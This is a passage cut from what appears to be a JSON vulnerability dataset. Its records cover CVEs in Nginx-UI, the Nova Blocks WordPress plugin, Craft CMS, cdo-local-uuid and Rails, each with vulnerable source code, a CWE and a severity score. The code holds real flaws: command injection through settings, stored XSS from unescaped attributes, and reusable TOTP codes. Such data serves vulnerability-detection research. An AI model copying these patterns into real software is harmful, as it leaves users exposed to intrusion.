    "description": "Nginx-UI is a web interface to manage Nginx configurations. It is vulnerable to arbitrary command execution by abusing the configuration settings. The `Home > Preference` page exposes a list of system settings such as `Run Mode`, `Jwt Secret`, `Node Secret` and `Terminal Start Command`. While the UI doesn't allow users to modify the `Terminal Start Command` setting, it is possible to do so by sending a request to the API. This issue may lead to authenticated remote code execution, privilege escalation, and information disclosure. This vulnerability has been patched in version 2.0.0.beta.9.",
    "vulnerability": {
      "file_level": [
        {
          "name": "api/system/settings.go",
          "content": "package system\n\nimport (\n    \"github.com/0xJacky/Nginx-UI/api\"\n    \"github.com/0xJacky/Nginx-UI/settings\"\n    \"github.com/gin-gonic/gin\"\n    \"net/http\"\n)\n\nfunc GetSettings(c *gin.Context) {\n    c.JSON(http.StatusOK, gin.H{\n        \"server\": settings.ServerSettings,\n        \"nginx\":  settings.NginxSettings,\n        \"openai\": settings.OpenAISettings,\n    })\n}\n\nfunc SaveSettings(c *gin.Context) {\n    var json struct {\n        Server settings.Server `json:\"server\"`\n        Nginx  settings.Nginx  `json:\"nginx\"`\n        Openai settings.OpenAI `json:\"openai\"`\n    }\n\n    if !api.BindAndValid(c, &json) {\n        return\n    }\n\n    settings.ServerSettings = json.Server\n    settings.NginxSettings = json.Nginx\n    settings.OpenAISettings = json.Openai\n\n    settings.ReflectFrom()\n\n    err := settings.Save()\n    if err != nil {\n        api.ErrHandler(c, err)\n        return\n    }\n\n    GetSettings(c)\n}\n"
        }
      ],
      "method_level": [
        "func GetSettings(c *gin.Context) {\n    c.JSON(http.StatusOK, gin.H{\n        \"server\": settings.ServerSettings,\n        \"nginx\":  settings.NginxSettings,\n        \"openai\": settings.OpenAISettings,\n    })\n}",
        "func SaveSettings(c *gin.Context) {\n    var json struct {\n        Server settings.Server `json:\"server\"`\n        Nginx  settings.Nginx  `json:\"nginx\"`\n        Openai settings.OpenAI `json:\"openai\"`\n    }\n\n    if !api.BindAndValid(c, &json) {\n        return\n    }\n\n    settings.ServerSettings = json.Server\n    settings.NginxSettings = json.Nginx\n    settings.OpenAISettings = json.Openai\n\n    settings.ReflectFrom()\n\n    err := settings.Save()\n    if err != nil {\n        api.ErrHandler(c, err)\n        return\n    }\n\n    GetSettings(c)\n}"
      ],
      "hunk_level": [
        {
          "line_no": 11,
          "content": "    c.JSON(http.StatusOK, gin.H{"
        },
        {
          "line_no": 12,
          "content": "        \"server\": settings.ServerSettings,"
        },
        {
          "line_no": 13,
          "content": "        \"nginx\":  settings.NginxSettings,"
        },
        {
          "line_no": 14,
          "content": "        \"openai\": settings.OpenAISettings,"
        },
        {
          "line_no": 15,
          "content": "    })"
        },
        {
          "line_no": 19,
          "content": "    var json struct {"
        },
        {
          "line_no": 20,
          "content": "        Server settings.Server `json:\"server\"`"
        },
        {
          "line_no": 21,
          "content": "        Nginx  settings.Nginx  `json:\"nginx\"`"
        },
        {
          "line_no": 22,
          "content": "        Openai settings.OpenAI `json:\"openai\"`"
        },
        {
          "line_no": 23,
          "content": "    }"
        },
        {
          "line_no": 25,
          "content": "    if !api.BindAndValid(c, &json) {"
        },
        {
          "line_no": 26,
          "content": "        return"
        },
        {
          "line_no": 27,
          "content": "    }"
        },
        {
          "line_no": 29,
          "content": "    settings.ServerSettings = json.Server"
        },
        {
          "line_no": 30,
          "content": "    settings.NginxSettings = json.Nginx"
        },
        {
          "line_no": 31,
          "content": "    settings.OpenAISettings = json.Openai"
        },
        {
          "line_no": 33,
          "content": "    settings.ReflectFrom()"
        },
        {
          "line_no": 35,
          "content": "    err := settings.Save()"
        },
        {
          "line_no": 36,
          "content": "    if err != nil {"
        },
        {
          "line_no": 37,
          "content": "        api.ErrHandler(c, err)"
        },
        {
          "line_no": 38,
          "content": "        return"
        },
        {
          "line_no": 39,
          "content": "    }"
        },
        {
          "line_no": 41,
          "content": "    GetSettings(c)"
        }
      ]
    },
    "cwe": [
      "CWE-77"
    ],
    "severity": "HIGH",
    "cvss_score": 7.1,
    "cvss_version": 3.1
  },
  {
    "id": 1164,
    "cve": "CVE-2024-8241",
    "description": "The Nova Blocks by Pixelgrade plugin for WordPress is vulnerable to Stored Cross-Site Scripting via the 'align' attribute of the 'wp:separator' Gutenberg block in all versions up to, and including, 2.1.7 due to insufficient input sanitization and output escaping on user supplied attributes. This makes it possible for authenticated attackers, with contributor-level access and above, to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page.",
    "vulnerability": {
      "file_level": [
        {
          "name": "packages/core/src/blocks/core/separator/index.js",
          "content": "import classnames from 'classnames';\n\nimport { addFilter } from '@wordpress/hooks';\nimport { useBlockProps } from \"@wordpress/block-editor\";\nimport { select } from \"@wordpress/data\";\n\nimport attributes from './attributes.json';\nimport edit from './edit';\n\nconst alterSeparatorSettings = ( settings ) => {\n\n  if ( settings.name !== 'core/separator' ) {\n    return settings;\n  }\n\n  return {\n    ...settings,\n    supports: {\n      ...settings.supports,\n      align: [ 'wide', 'full' ],\n      novaBlocks: {\n        colorSignal: {\n          attributes: true,\n          controls: true,\n          functionalColors: false,\n          paletteClassname: true,\n          paletteVariationClassname: true,\n          colorSignalClassname: true,\n          stickySourceColor: false,\n          minColorSignal: 1,\n        },\n        spaceAndSizing: true,\n      },\n    },\n    edit,\n    save: ( props ) => {\n      const { className, attributes } = props;\n      const { align } = attributes;\n      const settings = select( 'novablocks' ).getSettings();\n      const blockProps = useBlockProps.save( { className } );\n\n      return (\n        <div { ...blockProps } dangerouslySetInnerHTML={ { __html: settings?.separator?.markup } } />\n      )\n    }\n  }\n};\naddFilter( 'blocks.registerBlockType', 'novablocks/separator/alter-support', alterSeparatorSettings, 1 );\n\nconst alterSeparatorAttributes = ( settings ) => {\n\n  if ( settings.name !== 'core/separator' ) {\n    return settings;\n  }\n\n  return {\n    ...settings,\n    attributes: {\n      ...settings.attributes,\n      ...attributes\n    }\n  }\n};\naddFilter( 'blocks.registerBlockType', 'novablocks/separator/alter-attributes', alterSeparatorAttributes, 20 );\n"
        },
        {
          "name": "packages/core/src/blocks/core/separator/init.php",
          "content": "<?php\n/**\n * Handle the Separator block server logic.\n */\n\n// If this file is called directly, abort.\nif ( ! defined( 'ABSPATH' ) ) {\n\texit;\n}\n\nfunction novablocks_get_separator_attributes(): array {\n\n\treturn novablocks_merge_attributes_from_array( [\n\t\t'packages/color-signal/src/attributes.json',\n\t\t'packages/block-editor/src/filters/with-space-and-sizing/attributes.json',\n\t\t'packages/core/src/blocks/core/separator/attributes.json',\n\t] );\n}\n\nif ( ! function_exists( 'novablocks_render_separator_block' ) ) {\n\n\tfunction novablocks_render_separator_block( $block_content, $block ) {\n\n\t\tif ( 'core/separator' !== $block['blockName'] ) {\n\t\t\treturn $block_content;\n\t\t}\n\n\t\t$attributes = $block['attrs'];\n\n\t\t$attributes_config     = novablocks_get_separator_attributes();\n\t\t$attributes            = novablocks_get_attributes_with_defaults( $attributes, $attributes_config );\n\n\t\t$spacingProps   = novablocks_get_spacing_css( $attributes );\n\t\t$style = join( '; ', $spacingProps ) . '; ';\n\n\t\t$classes = [\n\t\t\t'wp-block-separator',\n\t\t\t'align' . $attributes['align']\n\t\t];\n\n\t\t$classes = array_merge( $classes, novablocks_get_color_signal_classes( $attributes ) );\n\n\t\tif ( ! empty( $attributes['className'] ) ) {\n\t\t\t$classes[] = $attributes['className'];\n\t\t}\n\n\t\t$data_attributes = novablocks_get_color_signal_data_attributes( $attributes );\n\n\t\tob_start(); ?>\n\n\t\t<div <?php echo $data_attributes; ?>\n\t\t\tclass=\"<?php echo join( ' ', $classes ) ?>\"\n\t\t\tstyle=\"<?php echo esc_attr( $style ); ?>\">\n\t\t\t<?php\n\t\t\t$novablocks_settings = novablocks_get_block_editor_settings();\n\t\t\tif ( ! empty( $novablocks_settings['separator'] && ! empty( $novablocks_settings['separator']['markup'] ) ) ) {\n\t\t\t\techo $novablocks_settings['separator']['markup'];\n\t\t\t}\n\t\t\t?>\n\t\t</div>\n\t\t<?php return ob_get_clean();\n\t}\n}\nadd_filter( 'render_block', 'novablocks_render_separator_block', 10, 2 );\n"
        }
      ],
      "method_level": [
        "alterSeparatorSettings = ( settings ) => {\n\n  if ( settings.name !== 'core/separator' ) {\n    return settings;\n  }\n\n  return {\n    ...settings,\n    supports: {\n      ...settings.supports,\n      align: [ 'wide', 'full' ],\n      novaBlocks: {\n        colorSignal: {\n          attributes: true,\n          controls: true,\n          functionalColors: false,\n          paletteClassname: true,\n          paletteVariationClassname: true,\n          colorSignalClassname: true,\n          stickySourceColor: false,\n          minColorSignal: 1,\n        },\n        spaceAndSizing: true,\n      },\n    },\n    edit,\n    save: ( props ) => {\n      const { className, attributes } = props;\n      const { align } = attributes;\n      const settings = select( 'novablocks' ).getSettings();\n      const blockProps = useBlockProps.save( { className } );\n\n      return (\n        <div { ...blockProps } dangerouslySetInnerHTML={ { __html: settings?.separator?.markup } } />\n      )\n    }\n  }\n}",
        "function novablocks_render_separator_block( $block_content, $block ) {\n\n\t\tif ( 'core/separator' !== $block['blockName'] ) {\n\t\t\treturn $block_content;\n\t\t}\n\n\t\t$attributes = $block['attrs'];\n\n\t\t$attributes_config     = novablocks_get_separator_attributes();\n\t\t$attributes            = novablocks_get_attributes_with_defaults( $attributes, $attributes_config );\n\n\t\t$spacingProps   = novablocks_get_spacing_css( $attributes );\n\t\t$style = join( '; ', $spacingProps ) . '; ';\n\n\t\t$classes = [\n\t\t\t'wp-block-separator',\n\t\t\t'align' . $attributes['align']\n\t\t];\n\n\t\t$classes = array_merge( $classes, novablocks_get_color_signal_classes( $attributes ) );\n\n\t\tif ( ! empty( $attributes['className'] ) ) {\n\t\t\t$classes[] = $attributes['className'];\n\t\t}\n\n\t\t$data_attributes = novablocks_get_color_signal_data_attributes( $attributes );\n\n\t\tob_start(); ?>\n\n\t\t<div <?php echo $data_attributes; ?>\n\t\t\tclass=\"<?php echo join( ' ', $classes ) ?>\"\n\t\t\tstyle=\"<?php echo esc_attr( $style ); ?>\">\n\t\t\t<?php\n\t\t\t$novablocks_settings = novablocks_get_block_editor_settings();\n\t\t\tif ( ! empty( $novablocks_settings['separator'] && ! empty( $novablocks_settings['separator']['markup'] ) ) ) {\n\t\t\t\techo $novablocks_settings['separator']['markup'];\n\t\t\t}\n\t\t\t?>\n\t\t</div>\n\t\t<?php return ob_get_clean();\n\t}"
      ],
      "hunk_level": [
        {
          "line_no": 40,
          "content": "      const blockProps = useBlockProps.save( { className } );"
        },
        {
          "line_no": 43,
          "content": "        <div { ...blockProps } dangerouslySetInnerHTML={ { __html: settings?.separator?.markup } } />"
        },
        {
          "line_no": 44,
          "content": "      )"
        },
        {
          "line_no": 45,
          "content": "    }"
        },
        {
          "line_no": 38,
          "content": "\t\t\t'align' . $attributes['align']"
        },
        {
          "line_no": 52,
          "content": "\t\t\tclass=\"<?php echo join( ' ', $classes ) ?>\""
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.4,
    "cvss_version": 3.1
  },
  {
    "id": 999,
    "cve": "CVE-2024-41800",
    "description": "Craft is a content management system (CMS). Craft CMS 5 allows reuse of TOTP tokens multiple times within the validity period. An attacker is able to re-submit a valid TOTP token to establish an authenticated session. This requires that the attacker has knowledge of the victim's credentials. This has been patched in Craft 5.2.3.",
    "vulnerability": {
      "file_level": [
        {
          "name": "src/auth/methods/TOTP.php",
          "content": "<?php\n/**\n * @link https://craftcms.com/\n * @copyright Copyright (c) Pixel & Tonic, Inc.\n * @license https://craftcms.github.io/license/\n */\n\nnamespace craft\\auth\\methods;\n\nuse BaconQrCode\\Renderer\\Image\\SvgImageBackEnd;\nuse BaconQrCode\\Renderer\\ImageRenderer;\nuse BaconQrCode\\Renderer\\RendererStyle\\RendererStyle;\nuse BaconQrCode\\Writer;\nuse Craft;\nuse craft\\records\\Authenticator as AuthenticatorRecord;\nuse craft\\web\\assets\\totp\\TotpAsset;\nuse craft\\web\\Session;\nuse craft\\web\\View;\nuse PragmaRX\\Google2FA\\Exceptions\\Google2FAException;\nuse PragmaRX\\Google2FA\\Google2FA;\nuse yii\\web\\ForbiddenHttpException;\n\n/**\n * Time-based one-time password authentication method.\n *\n * @author Pixel & Tonic, Inc. <support@pixelandtonic.com>\n * @since 5.0.0\n */\nclass TOTP extends BaseAuthMethod\n{\n    /**\n     * @var string The session variable name used to store the authenticator\n     * secret while setting up this method.\n     */\n    public string $secretParam;\n\n    /**\n     * @inheritdoc\n     */\n    public static function displayName(): string\n    {\n        return Craft::t('app', 'Authenticator App');\n    }\n\n    /**\n     * @inheritdoc\n     */\n    public static function description(): string\n    {\n        return Craft::t('app', 'Use an authenticator app to verify your identity.');\n    }\n\n    /**\n     * @inheritdoc\n     */\n    public function init(): void\n    {\n        parent::init();\n\n        if (!isset($this->secretParam)) {\n            $stateKeyPrefix = md5(sprintf('Craft.%s.%s.%s', Session::class, Craft::$app->id, $this->user->id));\n            $this->secretParam = sprintf('%s__secret', $stateKeyPrefix);\n        }\n    }\n\n    /**\n     * @inheritdoc\n     */\n    public function isActive(): bool\n    {\n        return self::secretFromDb($this->user->id) !== null;\n    }\n\n    /**\n     * @inheritdoc\n     */\n    public function getSetupHtml(string $containerId): string\n    {\n        $secret = $this->secret();\n        $totpFormId = sprintf('totp-form-%s', mt_rand());\n        $view = Craft::$app->getView();\n\n        $view->registerAssetBundle(TotpAsset::class);\n        $view->registerJsWithVars(fn($totpFormId, $containerId) => <<<JS\nCraft.createAuthFormHandler(Craft.TotpForm.METHOD, $('#' + $totpFormId), () => {\n  Craft.Slideout.instances[$containerId].showSuccess();\n  Craft.authMethodSetup.refresh();\n});\nJS, [\n            $view->namespaceInputId($totpFormId),\n            $containerId,\n        ]);\n\n        return $view->renderTemplate('_components/auth/methods/TOTP/setup.twig', [\n            'secret' => $secret,\n            'user' => $this->user,\n            'qrCode' => $this->generateQrCode($secret),\n            'totpFormId' => $totpFormId,\n        ], View::TEMPLATE_MODE_CP);\n    }\n\n    /**\n     * @inheritdoc\n     */\n    public function getAuthFormHtml(): string\n    {\n        $view = Craft::$app->getView();\n        $view->registerAssetBundle(TotpAsset::class);\n        return $view->renderTemplate('_components/auth/methods/TOTP/form.twig');\n    }\n\n    /**\n     * @inheritdoc\n     */\n    public function verify(mixed ...$args): bool\n    {\n        [$code] = $args;\n        if ($code === '') {\n            return false;\n        }\n\n        $storedSecret = self::secretFromDb($this->user->id);\n        $secret = $storedSecret ?? Craft::$app->getSession()->get($this->secretParam);\n\n        if (!$secret) {\n            return false;\n        }\n\n        try {\n            $verified = (new Google2FA())->verifyKey($secret, $code);\n        } catch (Google2FAException) {\n            return false;\n        }\n\n        if (!$verified) {\n            return false;\n        }\n\n        if (!$storedSecret) {\n            $this->storeSecret($this->user->id, $secret);\n            Craft::$app->getSession()->remove($this->secretParam);\n        }\n\n        return true;\n    }\n\n    /**\n     * @inheritdoc\n     */\n    public function remove(): void\n    {\n        AuthenticatorRecord::deleteAll([\n            'userId' => $this->user->id,\n        ]);\n    }\n\n    private function secret(): string\n    {\n        $google2fa = new Google2FA();\n        $secret = self::secretFromDb($this->user->id);\n\n        if (empty($secret)) {\n            try {\n                $secret = $google2fa->generateSecretKey(32);\n                Craft::$app->getSession()->set($this->secretParam, $secret);\n            } catch (\\Exception $e) {\n                Craft::$app->getErrorHandler()->logException($e);\n            }\n        }\n\n        return chunk_split($secret, 4, ' ');\n    }\n\n    private static function secretFromDb(int $userId): ?string\n    {\n        $record = AuthenticatorRecord::find()\n            ->select(['auth2faSecret'])\n            ->where(['userId' => $userId])\n            ->one();\n\n        return $record ? $record['auth2faSecret'] : null;\n    }\n\n    private function storeSecret(int $userId, string $secret): void\n    {\n        // Make sure they have an elevated session first\n        if (!Craft::$app->getUser()->getHasElevatedSession()) {\n            throw new ForbiddenHttpException(Craft::t('app', 'This action may only be performed with an elevated session.'));\n        }\n\n        /** @var AuthenticatorRecord|null $record */\n        $record = AuthenticatorRecord::find()\n            ->where(['userId' => $userId])\n            ->one();\n\n        if (!$record) {\n            $record = new AuthenticatorRecord();\n            $record->userId = $userId;\n        }\n\n        $record->auth2faSecret = $secret;\n        $record->save();\n    }\n\n    private function generateQrCode(string $secret): string\n    {\n        $qrCodeUrl = (new Google2FA())->getQRCodeUrl(\n            Craft::$app->getSystemName(),\n            $this->user->email,\n            $secret,\n        );\n\n        $renderer = new ImageRenderer(\n            new RendererStyle(150, 0),\n            new SvgImageBackEnd()\n        );\n\n        return (new Writer($renderer))->writeString($qrCodeUrl);\n    }\n}\n"
        }
      ],
      "method_level": [
        "public function verify(mixed ...$args): bool\n    {\n        [$code] = $args;\n        if ($code === '') {\n            return false;\n        }\n\n        $storedSecret = self::secretFromDb($this->user->id);\n        $secret = $storedSecret ?? Craft::$app->getSession()->get($this->secretParam);\n\n        if (!$secret) {\n            return false;\n        }\n\n        try {\n            $verified = (new Google2FA())->verifyKey($secret, $code);\n        } catch (Google2FAException) {\n            return false;\n        }\n\n        if (!$verified) {\n            return false;\n        }\n\n        if (!$storedSecret) {\n            $this->storeSecret($this->user->id, $secret);\n            Craft::$app->getSession()->remove($this->secretParam);\n        }\n\n        return true;\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 130,
          "content": "            $verified = (new Google2FA())->verifyKey($secret, $code);"
        }
      ]
    },
    "cwe": [
      "CWE-287"
    ],
    "severity": "MEDIUM",
    "cvss_score": 4.8,
    "cvss_version": 3.1
  },
  {
    "id": 64,
    "cve": "CVE-2024-22194",
    "description": "cdo-local-uuid project provides a specialized UUID-generating function that can, on user request, cause a program to generate deterministic UUIDs. An information leakage vulnerability is present in `cdo-local-uuid` at version `0.4.0`, and in `case-utils` in unpatched versions (matching the pattern `0.x.0`) at and since `0.5.0`, before `0.15.0`. The vulnerability stems from a Python function, `cdo_local_uuid.local_uuid()`, and its original implementation `case_utils.local_uuid()`. ",
    "vulnerability": {
      "file_level": [
        {
          "name": "case_utils/local_uuid.py",
          "content": "#!/usr/bin/env python3\n\n# Portions of this file contributed by NIST are governed by the following\n# statement:\n#\n# This software was developed at the National Institute of Standards\n# and Technology by employees of the Federal Government in the course\n# of their official duties. Pursuant to Title 17 Section 105 of the\n# United States Code, this software is not subject to copyright\n# protection within the United States. NIST assumes no responsibility\n# whatsoever for its use by other parties, and makes no guarantees,\n# expressed or implied, about its quality, reliability, or any other\n# characteristic.\n#\n# We would appreciate acknowledgement if the software is used.\n\n\"\"\"\nThis library is a wrapper for uuid, provided to generate repeatable UUIDs if requested.\n\nThe function local_uuid() should be used in code where a user could be expected to opt in to non-random UUIDs.\n\"\"\"\n\n__version__ = \"0.4.0\"\n\n__all__ = [\"configure\", \"local_uuid\"]\n\nimport logging\nimport os\nimport pathlib\nimport sys\nimport typing\nimport uuid\nimport warnings\n\nDEMO_UUID_BASE: typing.Optional[str] = None\n\nDEMO_UUID_COUNTER: int = 0\n\n_logger = logging.getLogger(pathlib.Path(__file__).name)\n\n\ndef configure() -> None:\n    \"\"\"\n    This function is part of setting up _demo_uuid() to generate non-random UUIDs.  See _demo_uuid() documentation for further setup notes.\n    \"\"\"\n    global DEMO_UUID_BASE\n\n    if os.getenv(\"DEMO_UUID_REQUESTING_NONRANDOM\") == \"NONRANDOM_REQUESTED\":\n        warnings.warn(\n            \"Environment variable DEMO_UUID_REQUESTING_NONRANDOM is deprecated.  See case_utils.local_uuid._demo_uuid for usage notes on its replacement, CASE_DEMO_NONRANDOM_UUID_BASE.  Proceeding with random UUIDs.\",\n            FutureWarning,\n        )\n        return\n\n    env_base_dir_name = os.getenv(\"CASE_DEMO_NONRANDOM_UUID_BASE\")\n    if env_base_dir_name is None:\n        return\n\n    base_dir_original_path = pathlib.Path(env_base_dir_name)\n    if not base_dir_original_path.exists():\n        warnings.warn(\n            \"Environment variable CASE_DEMO_NONRANDOM_UUID_BASE is expected to refer to an existing directory.  Proceeding with random UUIDs.\",\n            RuntimeWarning,\n        )\n        return\n    if not base_dir_original_path.is_dir():\n        warnings.warn(\n            \"Environment variable CASE_DEMO_NONRANDOM_UUID_BASE is expected to refer to a directory.  Proceeding with random UUIDs.\",\n            RuntimeWarning,\n        )\n        return\n\n    # Component: An emphasis this is an example.\n    demo_uuid_base_parts = [\"example.org\"]\n\n    # Component: Present working directory, relative to CASE_DEMO_NONRANDOM_UUID_BASE if that environment variable is an ancestor of pwd.\n    base_dir_resolved_path = base_dir_original_path.resolve()\n    srcdir_original_path = pathlib.Path(os.getcwd())\n    srcdir_resolved_path = srcdir_original_path.resolve()\n    # _logger.debug(\"base_dir_resolved_path = %r.\", base_dir_resolved_path)\n    # _logger.debug(\"srcdir_resolved_path = %r.\", srcdir_resolved_path)\n    try:\n        srcdir_relative_path = srcdir_resolved_path.relative_to(base_dir_resolved_path)\n        # _logger.debug(\"srcdir_relative_path = %r.\", srcdir_relative_path)\n        demo_uuid_base_parts.append(str(srcdir_relative_path))\n    except ValueError:\n        # If base_dir is not an ancestor directory of srcdir, default to srcdir.\n        # _logger.debug(\"PWD is not relative to base path.\")\n        demo_uuid_base_parts.append(str(srcdir_resolved_path))\n\n    # Component: Command of argument vector.\n    env_venv_name = os.getenv(\"VIRTUAL_ENV\")\n    if env_venv_name is None:\n        demo_uuid_base_parts.append(sys.argv[0])\n    else:\n        command_original_path = pathlib.Path(sys.argv[0])\n        command_resolved_path = command_original_path.resolve()\n        venv_original_path = pathlib.Path(env_venv_name)\n        venv_resolved_path = venv_original_path.resolve()\n        try:\n            command_relative_path = command_resolved_path.relative_to(\n                venv_resolved_path\n            )\n            # _logger.debug(\"command_relative_path = %r.\", command_relative_path)\n            demo_uuid_base_parts.append(str(command_relative_path))\n        except ValueError:\n            # _logger.debug(\"Command path is not relative to virtual environment path.\")\n            demo_uuid_base_parts.append(str(command_resolved_path))\n\n    if len(sys.argv) > 1:\n        # Component: Arguments of argument vector.\n        demo_uuid_base_parts.extend(sys.argv[1:])\n\n    # _logger.debug(\"demo_uuid_base_parts = %r.\", demo_uuid_base_parts)\n\n    DEMO_UUID_BASE = \"/\".join(demo_uuid_base_parts)\n\n\ndef _demo_uuid() -> str:\n    \"\"\"\n    This function generates a repeatable UUID, drawing on non-varying elements of the environment and process call for entropy.\n\n    This function is not intended to be called outside of this module.  Instead, local_uuid() should be called.\n\n    WARNING: This function was developed for use ONLY for reducing (but not eliminating) version-control edits to identifiers when generating sample data.  It creates UUIDs that are decidedly NOT random, and should remain consistent on repeated calls to the importing script.\n\n    To prevent accidental non-random UUID usage, two setup steps need to be done before calling this function:\n\n    * An environment variable, CASE_DEMO_NONRANDOM_UUID_BASE, must be set to a string provided by the caller.  The variable's required value is the path to some directory.  The variable's recommended value is the equivalent of the Make variable \"top_srcdir\" - that is, the root directory of the containing Git repository, some parent of the current process's current working directory.\n    * The configure() function in this module must be called.\n    \"\"\"\n    global DEMO_UUID_BASE\n    global DEMO_UUID_COUNTER\n\n    if os.getenv(\"CASE_DEMO_NONRANDOM_UUID_BASE\") is None:\n        raise ValueError(\n            \"demo_uuid() called without CASE_DEMO_NONRANDOM_UUID_BASE in environment.\"\n        )\n\n    if DEMO_UUID_BASE is None:\n        raise ValueError(\"demo_uuid() called with DEMO_UUID_BASE unset.\")\n\n    parts = [DEMO_UUID_BASE]\n\n    # Component: Incrementing counter.\n    DEMO_UUID_COUNTER += 1\n    parts.append(str(DEMO_UUID_COUNTER))\n\n    return str(uuid.uuid5(uuid.NAMESPACE_URL, \"/\".join(parts)))\n\n\ndef local_uuid() -> str:\n    \"\"\"\n    Generate either a UUID4, or if requested via environment configuration, a non-random demo UUID.\n    \"\"\"\n    global DEMO_UUID_BASE\n    if DEMO_UUID_BASE is None:\n        return str(uuid.uuid4())\n    else:\n        return _demo_uuid()\n"
        }
      ],
      "method_level": [
        "def configure() -> None:\n    \"\"\"\n    This function is part of setting up _demo_uuid() to generate non-random UUIDs.  See _demo_uuid() documentation for further setup notes.\n    \"\"\"\n    global DEMO_UUID_BASE\n\n    if os.getenv(\"DEMO_UUID_REQUESTING_NONRANDOM\") == \"NONRANDOM_REQUESTED\":\n        warnings.warn(\n            \"Environment variable DEMO_UUID_REQUESTING_NONRANDOM is deprecated.  See case_utils.local_uuid._demo_uuid for usage notes on its replacement, CASE_DEMO_NONRANDOM_UUID_BASE.  Proceeding with random UUIDs.\",\n            FutureWarning,\n        )\n        return\n\n    env_base_dir_name = os.getenv(\"CASE_DEMO_NONRANDOM_UUID_BASE\")\n    if env_base_dir_name is None:\n        return\n\n    base_dir_original_path = pathlib.Path(env_base_dir_name)\n    if not base_dir_original_path.exists():\n        warnings.warn(\n            \"Environment variable CASE_DEMO_NONRANDOM_UUID_BASE is expected to refer to an existing directory.  Proceeding with random UUIDs.\",\n            RuntimeWarning,\n        )\n        return\n    if not base_dir_original_path.is_dir():\n        warnings.warn(\n            \"Environment variable CASE_DEMO_NONRANDOM_UUID_BASE is expected to refer to a directory.  Proceeding with random UUIDs.\",\n            RuntimeWarning,\n        )\n        return\n\n    # Component: An emphasis this is an example.\n    demo_uuid_base_parts = [\"example.org\"]\n\n    # Component: Present working directory, relative to CASE_DEMO_NONRANDOM_UUID_BASE if that environment variable is an ancestor of pwd.\n    base_dir_resolved_path = base_dir_original_path.resolve()\n    srcdir_original_path = pathlib.Path(os.getcwd())\n    srcdir_resolved_path = srcdir_original_path.resolve()\n    # _logger.debug(\"base_dir_resolved_path = %r.\", base_dir_resolved_path)\n    # _logger.debug(\"srcdir_resolved_path = %r.\", srcdir_resolved_path)\n    try:\n        srcdir_relative_path = srcdir_resolved_path.relative_to(base_dir_resolved_path)\n        # _logger.debug(\"srcdir_relative_path = %r.\", srcdir_relative_path)\n        demo_uuid_base_parts.append(str(srcdir_relative_path))\n    except ValueError:\n        # If base_dir is not an ancestor directory of srcdir, default to srcdir.\n        # _logger.debug(\"PWD is not relative to base path.\")\n        demo_uuid_base_parts.append(str(srcdir_resolved_path))\n\n    # Component: Command of argument vector.\n    env_venv_name = os.getenv(\"VIRTUAL_ENV\")\n    if env_venv_name is None:\n        demo_uuid_base_parts.append(sys.argv[0])\n    else:\n        command_original_path = pathlib.Path(sys.argv[0])\n        command_resolved_path = command_original_path.resolve()\n        venv_original_path = pathlib.Path(env_venv_name)\n        venv_resolved_path = venv_original_path.resolve()\n        try:\n            command_relative_path = command_resolved_path.relative_to(\n                venv_resolved_path\n            )\n            # _logger.debug(\"command_relative_path = %r.\", command_relative_path)\n            demo_uuid_base_parts.append(str(command_relative_path))\n        except ValueError:\n            # _logger.debug(\"Command path is not relative to virtual environment path.\")\n            demo_uuid_base_parts.append(str(command_resolved_path))\n\n    if len(sys.argv) > 1:\n        # Component: Arguments of argument vector.\n        demo_uuid_base_parts.extend(sys.argv[1:])\n\n    # _logger.debug(\"demo_uuid_base_parts = %r.\", demo_uuid_base_parts)\n\n    DEMO_UUID_BASE = \"/\".join(demo_uuid_base_parts)"
      ],
      "hunk_level": [
        {
          "line_no": 100,
          "content": "        try:"
        },
        {
          "line_no": 106,
          "content": "        except ValueError:"
        },
        {
          "line_no": 107,
          "content": "            # _logger.debug(\"Command path is not relative to virtual environment path.\")"
        },
        {
          "line_no": 108,
          "content": "            demo_uuid_base_parts.append(str(command_resolved_path))"
        }
      ]
    },
    "cwe": [
      "CWE-215",
      "CWE-337"
    ],
    "severity": "LOW",
    "cvss_score": 2.2,
    "cvss_version": 3.1
  },
  {
    "id": 793,
    "cve": "CVE-2024-28103",
    "description": "Action Pack is a framework for handling and responding to web requests. Since 6.1.0, the application configurable Permissions-Policy is only served on responses with an HTML related Content-Type. This vulnerability is fixed in  6.1.7.8, 7.0.8.2, and 7.1.3.3.",
    "vulnerability": {
      "file_level": [
        {
          "name": "actionpack/lib/action_dispatch/http/permissions_policy.rb",
          "content": "# frozen_string_literal: true\n\n# :markup: markdown\n\nrequire \"active_support/core_ext/object/deep_dup\"\n\nmodule ActionDispatch # :nodoc:\n  # # Action Dispatch PermissionsPolicy\n  #\n  # Configures the HTTP\n  # [Feature-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Feature-Policy)\n  # response header to specify which browser features the current\n  # document and its iframes can use.\n  #\n  # Example global policy:\n  #\n  #     Rails.application.config.permissions_policy do |policy|\n  #       policy.camera      :none\n  #       policy.gyroscope   :none\n  #       policy.microphone  :none\n  #       policy.usb         :none\n  #       policy.fullscreen  :self\n  #       policy.payment     :self, \"https://secure.example.com\"\n  #     end\n  #\n  # The Feature-Policy header has been renamed to Permissions-Policy. The\n  # Permissions-Policy requires a different implementation and isn't yet supported\n  # by all browsers. To avoid having to rename this middleware in the future we\n  # use the new name for the middleware but keep the old header name and\n  # implementation for now.\n  class PermissionsPolicy\n    class Middleware\n      def initialize(app)\n        @app = app\n      end\n\n      def call(env)\n        _, headers, _ = response = @app.call(env)\n\n        return response unless html_response?(headers)\n        return response if policy_present?(headers)\n\n        request = ActionDispatch::Request.new(env)\n\n        if policy = request.permissions_policy\n          headers[ActionDispatch::Constants::FEATURE_POLICY] = policy.build(request.controller_instance)\n        end\n\n        if policy_empty?(policy)\n          headers.delete(ActionDispatch::Constants::FEATURE_POLICY)\n        end\n\n        response\n      end\n\n      private\n        def html_response?(headers)\n          if content_type = headers[Rack::CONTENT_TYPE]\n            content_type.include?(\"html\")\n          end\n        end\n\n        def policy_present?(headers)\n          headers[ActionDispatch::Constants::FEATURE_POLICY]\n        end\n\n        def policy_empty?(policy)\n          policy&.directives&.empty?\n        end\n    end\n\n    module Request\n      POLICY = \"action_dispatch.permissions_policy\"\n\n      def permissions_policy\n        get_header(POLICY)\n      end\n\n      def permissions_policy=(policy)\n        set_header(POLICY, policy)\n      end\n    end\n\n    MAPPINGS = {\n      self: \"'self'\",\n      none: \"'none'\",\n    